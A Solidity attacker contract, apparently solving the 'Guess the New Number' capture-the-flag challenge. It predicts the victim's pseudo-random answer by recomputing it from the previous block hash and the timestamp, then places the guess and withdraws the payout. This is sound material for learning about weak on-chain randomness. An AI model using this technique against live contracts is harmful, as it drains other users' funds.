pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

contract GuessNewNumberAttacker {
    address owner;

    function GuessNewNumberAttacker() public payable {
        owner = msg.sender;
    }

    function attack(address _victima) public payable {
        require(msg.value == 1 ether);
        
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        GuessTheNewNumberChallenge victima = GuessTheNewNumberChallenge(_victima);
        victima.guess.value(msg.value)(answer);

        withdraw();

    }

    function () public payable { }
    
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
    
}